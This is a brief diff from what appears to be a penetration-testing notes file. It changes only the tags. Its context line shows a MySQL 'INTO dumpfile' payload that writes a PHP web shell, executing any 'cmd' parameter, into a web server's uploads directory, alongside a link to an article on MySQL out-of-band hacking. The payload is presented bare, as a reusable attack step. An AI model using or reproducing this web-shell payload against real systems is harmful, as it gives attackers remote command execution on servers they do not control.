@@ -9,4 +9,4 @@ SELECT '<?php exec($_GET["cmd"]); ?>' INTO dumpfile '/var/www/html/uploads/mshel
 https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/
 
 
-tags: mysql webshell shell christian 
+tags: #mysql #webshell #shell #christian 
